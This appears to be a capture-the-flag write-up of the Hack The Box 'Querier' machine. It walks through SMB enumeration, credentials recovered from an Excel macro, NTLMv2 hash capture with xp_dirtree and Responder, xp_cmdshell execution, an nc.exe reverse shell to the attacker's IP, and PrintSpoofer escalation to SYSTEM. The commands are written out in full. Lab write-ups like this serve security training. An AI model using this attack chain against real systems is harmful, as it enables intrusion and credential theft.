# Querier - Medium

Target IP: **10.129.85.202**

## User Flag

Initial scan: ```sudo nmap -sC -sV -p- 10.129.85.202 -v```

Output shows quite a few open ports.

```
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   10.129.85.202:1433: 
|     Target_Name: HTB
|     NetBIOS_Domain_Name: HTB
|     NetBIOS_Computer_Name: QUERIER
|     DNS_Domain_Name: HTB.LOCAL
|     DNS_Computer_Name: QUERIER.HTB.LOCAL
|     DNS_Tree_Name: HTB.LOCAL
|_    Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-10-19T14:06:24
| Not valid after:  2056-10-19T14:06:24
| MD5:   bfa8:a6ba:f3d4:6fd0:e871:b276:c206:19f3
|_SHA-1: e869:65a8:5fb6:c734:c689:1e02:8421:13cc:ffc8:f48e
|_ssl-date: 2026-10-19T15:23:07+00:00; 0s from scanner time.
| ms-sql-info: 
|   10.129.85.202:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

We have RPC, SMB, MSSQL, and two HTTP web servers running on the host.

It seems like we can enumerate the SMB server without credentials. the ```Reports``` share is interesting.

```
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-bsqhrrxv8p]─[~]
└──╼ [★]$ smbclient -L //10.129.85.202/ -N

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	Reports         Disk      
SMB1 disabled -- no workgroup available
```

Let's try authenticating.

We are successful, and there is one file inside the share.

```
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-bsqhrrxv8p]─[~]
└──╼ [★]$ smbclient //10.129.85.202/Reports -N
Try "help" to get a list of possible commands.              
smb: \> ls
  .                                   D        0  Mon Jan 28 18:23:48 2019
  ..                                  D        0  Mon Jan 28 18:23:48 2019
  Currency Volume Report.xlsm         A    12229  Sun Jan 27 17:21:34 2019

		5158399 blocks of size 4096. 848757 blocks available
```

Let's download it.

```
smb: \> get "Currency Volume Report.xlsm" Report.xlsm
getting file \Currency Volume Report.xlsm of size 12229 as Report.xlsm (81.2 KiloBytes/sec) (average 81.2 KiloBytes/sec)
```

This is an Excel file. A searching online reveals that ```.xlsm``` files also contain macros, and that the file is actually a zipped archive.

```
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-bsqhrrxv8p]─[~]
└──╼ [★]$ file Report.xlsm 
Report.xlsm: Microsoft Excel 2007+
```

Let's unzip the file.

```
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-bsqhrrxv8p]─[~/Report]
└──╼ [★]$ unzip Report.xlsm 
Archive:  Report.xlsm
  inflating: [Content_Types].xml     
  inflating: _rels/.rels             
  inflating: xl/workbook.xml         
  inflating: xl/_rels/workbook.xml.rels  
  inflating: xl/worksheets/sheet1.xml  
  inflating: xl/theme/theme1.xml     
  inflating: xl/styles.xml           
  inflating: xl/vbaProject.bin       
  inflating: docProps/core.xml       
  inflating: docProps/app.xml        
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-bsqhrrxv8p]─[~/Report]
└──╼ [★]$ ls
'[Content_Types].xml'   docProps   _rels   Report.xlsm   xl
```

Inside the ```xl``` directory, looking inside the ```vbaProject.bin``` file gets us a set of credentials for the MSSQL instance.

```
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-bsqhrrxv8p]─[~/Report/xl]
└──╼ [★]$ strings vbaProject.bin 
 macro to pull data for client volume reports
n.Conn]
Open 
rver=<
SELECT * FROM volume;
word>
 MsgBox "connection successful"
Set rs = conn.Execute("SELECT * @@version;")
Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6
```

We can authenticate to the MSSQL server.

```
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-bsqhrrxv8p]─[~]
└──╼ [★]$ mssqlclient.py reporting:'PcwTWTHRwryjc$c6'@10.129.85.202 -windows-auth
Impacket v0.14.0.dev0+20260407.172353.7fc084ad - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: volume
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(QUERIER): Line 1: Changed database context to 'volume'.
[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2017 RTM (14.0.1000)
[!] Press help for extra shell commands
SQL (QUERIER\reporting  reporting@volume)> 
```

There are a few databases inside. All of them are default MSSQL databases except ```volume```.

```
SQL (QUERIER\reporting  reporting@volume)> enum_db
name     is_trustworthy_on   
------   -----------------   
master                   0   
tempdb                   0   
model                    0   
msdb                     1   
volume                   0   
```

There doesn't seem to be any information in ```volume```.

```
SQL (QUERIER\reporting  reporting@volume)> SELECT TABLE_NAME FROM VOLUME.INFORMATION_SCHEMA.TABLES;
TABLE_NAME   
----------   
```

This makes me think that we have to use something like ```xp_cmdshell```. However, ```reporting``` lacks the permissions.

```
SQL (QUERIER\reporting  reporting@volume)> enable_xp_cmdshell
ERROR(QUERIER): Line 105: User does not have permission to perform this action.
ERROR(QUERIER): Line 1: You do not have permission to run the RECONFIGURE statement.
ERROR(QUERIER): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.
ERROR(QUERIER): Line 1: You do not have permission to run the RECONFIGURE statement.
```

Perhaps we can escalate privileges by capturing the hash of the service account responsible for running the MSSQL service. We can do this with ```xp_dirtree``` and ```Responder```.

Let's try it. We first run Responder on our attack box.

```
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-bsqhrrxv8p]─[~]
└──╼ [★]$ sudo responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C
```

Then, we run ```xp_dirtree``` to have the service account load files from a nonexistent share.

```
SQL (QUERIER\reporting  reporting@volume)> EXEC master..xp_dirtree '\\10.10.15.194\hi\'
username                       
----------------------------   
QUERIER\reporting  reporting   
```

On our Responder instance, we capture the hash for ```mssql-svc```.

```
[SMB] NTLMv2-SSP Client   : 10.129.85.202
[SMB] NTLMv2-SSP Username : QUERIER\mssql-svc
[SMB] NTLMv2-SSP Hash     : mssql-svc::QUERIER:aea9945b65f271b2:44C06CB4679861E4CB3238C8A82B6196:010100000000000080D84944C15FDD01A6663EB84B4AFA7300000000020008005A0036005100420001001E00570049004E002D00500034004C005100540054003000500033004200470004003400570049004E002D00500034004C00510054005400300050003300420047002E005A003600510042002E004C004F00430041004C00030014005A003600510042002E004C004F00430041004C00050014005A003600510042002E004C004F00430041004C000700080080D84944C15FDD01060004000200000008003000300000000000000000000000003000008E762B3FF9109C977F888E0C2C36D3DC10AE0D8195DED4C9B97C936A07A2FC0B0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310035002E00310039003400000000000000000000000000
```

Hashcat is able to crack the NTLMv2 hash.

```
MSSQL-SVC::QUERIER:aea9945b65f271b2:44c06cb4679861e4cb3238c8a82b6196:010100000000000080d84944c15fdd01a6663eb84b4afa7300000000020008005a0036005100420001001e00570049004e002d00500034004c005100540054003000500033004200470004003400570049004e002d00500034004c00510054005400300050003300420047002e005a003600510042002e004c004f00430041004c00030014005a003600510042002e004c004f00430041004c00050014005a003600510042002e004c004f00430041004c000700080080d84944c15fdd01060004000200000008003000300000000000000000000000003000008e762b3ff9109c977f888e0c2c36d3dc10ae0d8195ded4c9b97c936a07a2fc0b0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310035002e00310039003400000000000000000000000000:corporate568
```

Let's authenticate to the MSSQL server as ```mssql-svc```.

```
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-bsqhrrxv8p]─[~]
└──╼ [★]$ mssqlclient.py mssql-svc:'corporate568'@10.129.85.202 -windows-auth
Impacket v0.14.0.dev0+20260407.172353.7fc084ad - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(QUERIER): Line 1: Changed database context to 'master'.
[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2017 RTM (14.0.1000)
[!] Press help for extra shell commands
SQL (QUERIER\mssql-svc  dbo@master)> 
```

This account has the permissions to enable ```xp_cmdshell```.

```
SQL (QUERIER\mssql-svc  dbo@master)> enable_xp_cmdshell
INFO(QUERIER): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
INFO(QUERIER): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (QUERIER\mssql-svc  dbo@master)> RECONFIGURE
```

We have command execution as ```mssql-svc```.

```
SQL (QUERIER\mssql-svc  dbo@master)> EXEC master..xp_cmdshell 'whoami';
output              
-----------------   
querier\mssql-svc   
NULL                
```

Let's download ```nc.exe``` onto the remote machine and initiate a connection back to us.

```certutil``` is available to us, so we can use it to transfer files.

```
SQL (QUERIER\mssql-svc  dbo@master)> EXEC master..xp_cmdshell 'certutil';
output                                            
-----------------------------------------------   
CertUtil: -dump command completed successfully.   
NULL                                              
```

Not sure why, but ```certutil``` doesn't seem to work.

```
SQL (QUERIER\mssql-svc  dbo@master)> xp_cmdshell certutil -urlcache -split -f "http://10.10.15.194:8000/nc.exe" "C:\Windows\Temp\nc.exe"
ERROR(QUERIER): Line 1: An error occurred during the execution of xp_cmdshell. A call to 'CreateProcess' failed with error code: '5'.
```

We can just use a powershell command instead.

```
SQL (QUERIER\mssql-svc  dbo@master)> EXEC master..xp_cmdshell 'powershell -c "Invoke-WebRequest -Uri http://10.10.15.194:8000/nc.exe -OutFile C:\Windows\Temp\nc.exe"';
output   
------   
NULL     
```

We can now run ```nc.exe``` to initiate a connection back to us.

```
SQL (QUERIER\mssql-svc  dbo@master)> EXEC master..xp_cmdshell 'C:\Windows\Temp\nc.exe 10.10.15.194 4444 -e cmd.exe';
```

Finally, we get a shell as ```mssql-svc```.

```
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-bsqhrrxv8p]─[~]
└──╼ [★]$ rlwrap nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.85.202 49683
Microsoft Windows [Version 10.0.17763.292]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
querier\mssql-svc

C:\Windows\system32>
```

We can proceed to get the user flag from here.

## Root Flag

```mssql-svc``` has ```SeImpersonatePrivilege``` enabled.

```
C:\>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

We can see that the specific build works better with PrintSpoofer.

```
C:\>systeminfo
systeminfo

Host Name:                 QUERIER
OS Name:                   Microsoft Windows Server 2019 Standard
OS Version:                10.0.17763 N/A Build 17763
```

The spooler service is also enabled.

```
C:\Windows\Temp>sc query spooler
sc query spooler

SERVICE_NAME: spooler 
        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
        STATE              : 4  RUNNING 
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```

Let's transfer the executable over.

```
PS C:\Windows\Temp> Invoke-WebRequest -Uri "http://10.10.15.194:8000/PrintSpoofer64.exe" -OutFile "C:\Windows\Temp\PrintSpoofer64.exe"
```

We can run the executable, with the command to run being another connection to our attack box using ```nc.exe``` that we transferred before.

```
PS C:\Windows\Temp> .\PrintSpoofer64.exe -c "nc.exe 10.10.15.194 4444 -e cmd.exe"
.\PrintSpoofer64.exe -c "nc.exe 10.10.15.194 4444 -e cmd.exe"
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
```

After this, we catch a shell on our listener as ```NT AUTHORITY\SYSTEM```.

```
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-bsqhrrxv8p]─[~]
└──╼ [★]$ rlwrap nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.85.202 49689
Microsoft Windows [Version 10.0.17763.292]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

We can proceed to get the root flag from here.

Nice pwn!

## Contact

Email: <johnyang4406@gmail.com>, <john_s_yang@brown.edu>

LinkedIn: <https://www.linkedin.com/in/john-yang-747726292/>

HackTheBox: <https://profile.hackthebox.com/profile/019c423f-9b9b-708f-8b31-55983b89dddd?utm_medium=copy_url/>
